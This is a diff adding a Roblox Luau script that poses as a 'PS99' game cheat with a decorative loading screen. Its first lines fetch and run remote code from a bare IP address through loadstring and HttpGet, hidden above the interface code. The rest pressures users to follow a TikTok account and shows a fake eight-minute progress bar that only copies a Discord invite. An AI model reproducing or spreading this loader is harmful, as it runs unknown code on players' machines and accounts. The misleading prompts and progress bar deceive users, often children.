@@ -1,0 +1,397 @@
+ID="8abf2306-93bc-4633-9ff9-c7804382d873";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+
+-- SERVICES
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- CLEANUP OLD UI
+pcall(function()
+    if CoreGui:FindFirstChild("PS99LoadingScreen") then
+        CoreGui.PS99LoadingScreen:Destroy()
+    end
+end)
+
+-- GUI SETUP
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PS99LoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = CoreGui
+
+-- BACKGROUND MUSIC
+local bgMusic = Instance.new("Sound")
+bgMusic.Name = "BackgroundMusic"
+bgMusic.SoundId = "rbxassetid://1837467334"
+bgMusic.Looped = true
+bgMusic.Volume = 0.3
+bgMusic.Parent = SoundService
+
+-- Play music with error handling
+pcall(function()
+    bgMusic:Play()
+end)
+
+-- MAIN BACKGROUND
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 0
+mainFrame.Parent = screenGui
+
+-- PARTICLE STARS
+local particleFolder = Instance.new("Folder")
+particleFolder.Name = "ParticleFolder"
+particleFolder.Parent = mainFrame
+
+local center = Vector2.new(0.5, 0.5)
+local starConnections = {}
+
+for i = 1, 150 do
+    local star = Instance.new("Frame")
+    star.Name = "Star" .. i
+    local size = math.random(1, 2)
+    star.Size = UDim2.new(0, size, 0, size)
+    star.BackgroundColor3 = Color3.new(1, 1, 1)
+    star.BackgroundTransparency = math.random(40, 70) / 100
+    star.BorderSizePixel = 0
+    star.ZIndex = 1
+    star.Parent = particleFolder
+
+    local comet = Instance.new("UIGradient")
+    comet.Rotation = 0
+    comet.Color = ColorSequence.new(Color3.new(1, 1, 0.8), Color3.new(1, 1, 1))
+    comet.Transparency = NumberSequence.new(0.1, 1)
+    comet.Parent = star
+
+    local angle = math.random() * math.pi * 2
+    local radius = math.random(100, 250) / 500
+    local offset = math.random() * math.pi * 2
+    local speed = math.random(50, 80) / 10000
+
+    -- Use RunService for better performance
+    local connection = RunService.Heartbeat:Connect(function()
+        if star.Parent then
+            angle = angle + speed
+            local x = center.X + math.cos(angle + offset) * radius
+            local y = center.Y + math.sin(angle + offset) * radius
+            star.Position = UDim2.new(x, 0, y, 0)
+        else
+            connection:Disconnect()
+        end
+    end)
+    
+    table.insert(starConnections, connection)
+end
+
+-- COPY DISCORD INVITE BUTTON
+local discordInvite = "https://discord.gg/A65B7WSw"
+
+local copyDiscordButton = Instance.new("TextButton")
+copyDiscordButton.Name = "CopyDiscordButton"
+copyDiscordButton.Size = UDim2.new(0.25, 0, 0.06, 0)
+copyDiscordButton.Position = UDim2.new(0.375, 0, 0.75, 0)
+copyDiscordButton.BackgroundColor3 = Color3.fromRGB(72, 88, 222)
+copyDiscordButton.Text = "Copy Discord Invite"
+copyDiscordButton.TextColor3 = Color3.new(1, 1, 1)
+copyDiscordButton.Font = Enum.Font.GothamBold
+copyDiscordButton.TextScaled = true
+copyDiscordButton.BorderSizePixel = 0
+copyDiscordButton.ZIndex = 10
+copyDiscordButton.Parent = mainFrame
+
+local discordCorner = Instance.new("UICorner")
+discordCorner.CornerRadius = UDim.new(0, 8)
+discordCorner.Parent = copyDiscordButton
+
+local copySound = Instance.new("Sound")
+copySound.Name = "CopySound"
+copySound.SoundId = "rbxassetid://9118823107"
+copySound.Volume = 1
+copySound.Parent = copyDiscordButton
+
+local popup = Instance.new("TextLabel")
+popup.Name = "Popup"
+popup.Size = UDim2.new(0.4, 0, 0.06, 0)
+popup.Position = UDim2.new(0.3, 0, 0.82, 0)
+popup.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+popup.TextColor3 = Color3.new(1, 1, 1)
+popup.Font = Enum.Font.GothamBold
+popup.TextScaled = true
+popup.BorderSizePixel = 0
+popup.Visible = false
+popup.ZIndex = 11
+popup.Parent = mainFrame
+
+local popupCorner = Instance.new("UICorner")
+popupCorner.CornerRadius = UDim.new(0, 8)
+popupCorner.Parent = popup
+
+local function showCopyPopup(text)
+    popup.Text = text
+    popup.Visible = true
+    task.delay(2, function()
+        if popup then
+            popup.Visible = false
+        end
+    end)
+end
+
+copyDiscordButton.MouseButton1Click:Connect(function()
+    pcall(function()
+        if setclipboard then
+            setclipboard(discordInvite)
+            copySound:Play()
+
+            local tween1 = TweenService:Create(copyDiscordButton, TweenInfo.new(0.15), {
+                Size = UDim2.new(0.27, 0, 0.065, 0)
+            })
+            tween1:Play()
+
+            tween1.Completed:Connect(function()
+                local tween2 = TweenService:Create(copyDiscordButton, TweenInfo.new(0.15), {
+                    Size = UDim2.new(0.25, 0, 0.06, 0)
+                })
+                tween2:Play()
+            end)
+
+            showCopyPopup("Copied Discord Invite!")
+        else
+            showCopyPopup("Clipboard not supported!")
+        end
+    end)
+end)
+
+-- PROMPT FUNCTION
+local function createPrompt(text, yesCallback, noCallback)
+    local holder = Instance.new("Frame")
+    holder.Name = "PromptHolder"
+    holder.Size = UDim2.new(0.5, 0, 0.3, 0)
+    holder.Position = UDim2.new(0.25, 0, 0.35, 0)
+    holder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    holder.BackgroundTransparency = 0.1
+    holder.BorderSizePixel = 0
+    holder.ZIndex = 10
+    holder.Parent = mainFrame
+    
+    local holderCorner = Instance.new("UICorner")
+    holderCorner.CornerRadius = UDim.new(0, 12)
+    holderCorner.Parent = holder
+
+    local label = Instance.new("TextLabel")
+    label.Name = "PromptLabel"
+    label.Size = UDim2.new(1, -20, 0.5, 0)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.Font = Enum.Font.GothamSemibold
+    label.TextScaled = true
+    label.TextWrapped = true
+    label.BorderSizePixel = 0
+    label.ZIndex = 11
+    label.Parent = holder
+
+    local yesBtn = Instance.new("TextButton")
+    yesBtn.Name = "YesButton"
+    yesBtn.Size = UDim2.new(0.45, 0, 0.15, 0)
+    yesBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
+    yesBtn.Text = "Yes"
+    yesBtn.BackgroundColor3 = Color3.fromRGB(45, 120, 45)
+    yesBtn.TextColor3 = Color3.new(1, 1, 1)
+    yesBtn.Font = Enum.Font.GothamBold
+    yesBtn.TextScaled = true
+    yesBtn.BorderSizePixel = 0
+    yesBtn.ZIndex = 11
+    yesBtn.Parent = holder
+    
+    local yesBtnCorner = Instance.new("UICorner")
+    yesBtnCorner.CornerRadius = UDim.new(0, 8)
+    yesBtnCorner.Parent = yesBtn
+
+    local noBtn = Instance.new("TextButton")
+    noBtn.Name = "NoButton"
+    noBtn.Size = UDim2.new(0.45, 0, 0.15, 0)
+    noBtn.Position = UDim2.new(0.5, 0, 0.55, 0)
+    noBtn.Text = "No"
+    noBtn.BackgroundColor3 = Color3.fromRGB(120, 45, 45)
+    noBtn.TextColor3 = Color3.new(1, 1, 1)
+    noBtn.Font = Enum.Font.GothamBold
+    noBtn.TextScaled = true
+    noBtn.BorderSizePixel = 0
+    noBtn.ZIndex = 11
+    noBtn.Parent = holder
+    
+    local noBtnCorner = Instance.new("UICorner")
+    noBtnCorner.CornerRadius = UDim.new(0, 8)
+    noBtnCorner.Parent = noBtn
+
+    local copyYouTubeBtn = Instance.new("TextButton")
+    copyYouTubeBtn.Name = "CopyYouTubeButton"
+    copyYouTubeBtn.Size = UDim2.new(0.45, 0, 0.15, 0)
+    copyYouTubeBtn.Position = UDim2.new(0.5, 0, 0.75, 0)
+    copyYouTubeBtn.Text = "Copy YouTube Username"
+    copyYouTubeBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    copyYouTubeBtn.TextColor3 = Color3.new(1, 1, 1)
+    copyYouTubeBtn.Font = Enum.Font.GothamBold
+    copyYouTubeBtn.TextScaled = true
+    copyYouTubeBtn.BorderSizePixel = 0
+    copyYouTubeBtn.ZIndex = 11
+    copyYouTubeBtn.Parent = holder
+    
+    local youtubeBtnCorner = Instance.new("UICorner")
+    youtubeBtnCorner.CornerRadius = UDim.new(0, 8)
+    youtubeBtnCorner.Parent = copyYouTubeBtn
+
+    local copyPopup = Instance.new("TextLabel")
+    copyPopup.Name = "CopyPopup"
+    copyPopup.Size = UDim2.new(0.9, 0, 0.12, 0)
+    copyPopup.Position = UDim2.new(0.05, 0, 0.95, 0)
+    copyPopup.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    copyPopup.TextColor3 = Color3.new(1, 1, 1)
+    copyPopup.Font = Enum.Font.GothamBold
+    copyPopup.TextScaled = true
+    copyPopup.BorderSizePixel = 0
+    copyPopup.Visible = false
+    copyPopup.ZIndex = 12
+    copyPopup.Parent = holder
+    
+    local copyPopupCorner = Instance.new("UICorner")
+    copyPopupCorner.CornerRadius = UDim.new(0, 8)
+    copyPopupCorner.Parent = copyPopup
+
+    copyYouTubeBtn.MouseButton1Click:Connect(function()
+        pcall(function()
+            if setclipboard then
+                setclipboard("Filtpants")
+                copyPopup.Text = "Copied YouTube Username!"
+                copyPopup.Visible = true
+                task.delay(2, function()
+                    if copyPopup then
+                        copyPopup.Visible = false
+                    end
+                end)
+            else
+                copyPopup.Text = "Clipboard not supported!"
+                copyPopup.Visible = true
+                task.delay(2, function()
+                    if copyPopup then
+                        copyPopup.Visible = false
+                    end
+                end)
+            end
+        end)
+    end)
+
+    yesBtn.MouseButton1Click:Connect(function()
+        holder:Destroy()
+        if yesCallback then
+            yesCallback()
+        end
+    end)
+
+    noBtn.MouseButton1Click:Connect(function()
+        holder:Destroy()
+        if noCallback then
+            noCallback()
+        end
+    end)
+end
+
+-- LOADING BAR FUNCTION
+local function showLoadingUI()
+    local barContainer = Instance.new("Frame")
+    barContainer.Name = "LoadingBarContainer"
+    barContainer.Size = UDim2.new(0.5, 0, 0.05, 0)
+    barContainer.Position = UDim2.new(0.25, 0, 0.85, 0)
+    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    barContainer.ZIndex = 3
+    barContainer.BorderSizePixel = 0
+    barContainer.Parent = mainFrame
+    
+    local barContainerCorner = Instance.new("UICorner")
+    barContainerCorner.CornerRadius = UDim.new(0, 10)    barContainerCorner.Parent = barContainer
+
+    local barFill = Instance.new("Frame")
+    barFill.Name = "LoadingBarFill"
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+    barFill.BorderSizePixel = 0
+    barFill.ZIndex = 4
+    barFill.Parent = barContainer
+    
+    local barFillCorner = Instance.new("UICorner")
+    barFillCorner.CornerRadius = UDim.new(0, 10)
+    barFillCorner.Parent = barFill
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Name = "PercentText"
+    percentText.Size = UDim2.new(1, 0, 1, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.TextColor3 = Color3.new(1, 1, 1)
+    percentText.Font = Enum.Font.GothamBold
+    percentText.TextScaled = true
+    percentText.BorderSizePixel = 0
+    percentText.ZIndex = 5
+    percentText.Text = "0%"
+    percentText.Parent = barContainer
+
+    local totalTime = 480 -- 8 minutes in seconds
+    local increment = totalTime / 100 -- time per percent
+
+    task.spawn(function()
+        for i = 1, 100 do
+            if percentText and percentText.Parent then
+                percentText.Text = i .. "%"
+                barFill.Size = UDim2.new(i / 100, 0, 1, 0)
+                task.wait(increment)
+            else
+                break
+            end
+        end
+
+        -- Auto copy Discord invite and show message
+        pcall(function()
+            if setclipboard then
+                setclipboard(discordInvite)
+                showCopyPopup("Copied Discord Invite!")
+            end
+        end)
+
+        print("Loading complete!")
+        
+        -- Clean up connections
+        for _, connection in ipairs(starConnections) do
+            connection:Disconnect()
+        end
+    end)
+end
+
+-- QUEST FLOW WITH ERROR HANDLING
+pcall(function()
+    createPrompt("Hello, Sir. Before continuing, would you like to do a quest?", function()
+        createPrompt("Hello Follow @moneybagz3483 on tiktok for the script to work. If you already did, please click yes and wait for 8 minutes.", function()
+            createPrompt("Did you follow?", function()
+                createPrompt("Are you sure you followed?", function()
+                    showLoadingUI()
+                end, function()
+                    showLoadingUI()
+                end)
+            end, function()
+                showLoadingUI()
+            end)
+        end, function()
+            showLoadingUI()
+        end)
+    end, function()
+        showLoadingUI()
+    end)
+end)
